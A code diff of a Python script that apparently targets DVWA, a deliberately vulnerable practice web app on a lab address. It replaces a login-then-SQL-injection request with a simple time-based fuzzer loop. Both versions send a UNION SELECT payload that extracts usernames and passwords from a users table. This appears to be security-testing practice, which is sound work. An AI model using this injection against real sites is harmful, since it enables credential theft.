@@ -1,36 +1,31 @@
-#from BeautifulSoup import BeautifulSoup
-import urllib
-import urllib2
-import cookielib
-import mutator
+#!/usr/bin/env python
+from optparse import OptionParser
+import importlib
+import time
 
-cj = cookielib.CookieJar()
-opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+# Options for running the fuzzer
+parser = OptionParser()
+parser.add_option("-s", "--secs", dest="seconds",
+                  help="seconds to fuzz for", default=10)
+parser.add_option("-m", "--mins", dest="minutes",
+                  help="minutes to fuzz for", default=0)
+parser.add_option("-o", "--hours", dest="hours",
+                  help="hours to fuzz for", default=0)
+parser.add_option("-x", "--sender", dest="sender",
+                  help="sender class to use while fuzzing")
+(options, args) = parser.parse_args()
 
-opener.addheaders = [('User-agent', 'DVWATesting')]
-urllib2.install_opener(opener)
-authentication_url = "http://192.168.2.2/DVWA/login.php"
-sql_url = "http://192.168.2.2/DVWA/vulnerabilities/sqli/?"
-login_params = {
-               "username" : "admin",
-               "password" : "password",
-               "Login": "Login"
-              }
-login_args = urllib.urlencode(login_params)
+# Make sure we get the sender class
+if options.sender is None:
+    print("No sender class supplied")
+    exit(1)
 
-req = urllib2.Request(authentication_url, login_args)
+# Import sender class and initialize
+sendClass = importlib.import_module(options.sender)
+sender = sendClass.sender()
 
-resp = urllib2.urlopen(req)
-contents = resp.read()
-
-sql_params = {
-              "id" : "1' UNION select last_name, password from users;#",
-              "Submit" : "Submit"
-}
-sql_args = urllib.urlencode(sql_params)
-
-req = urllib2.Request(sql_url + sql_args + '#')
-resp = urllib2.urlopen(req)
-contents = resp.read()
-print(contents)
-
+# Fuzz for the given amount of time
+endTime = time.time() + int(options.seconds) + (60 * int(options.minutes)) + (3600 * int(options.hours))
+while(time.time() < endTime):
+    #TODO FUZZ
+    print sender.send("1' UNION select last_name, password from users;#")
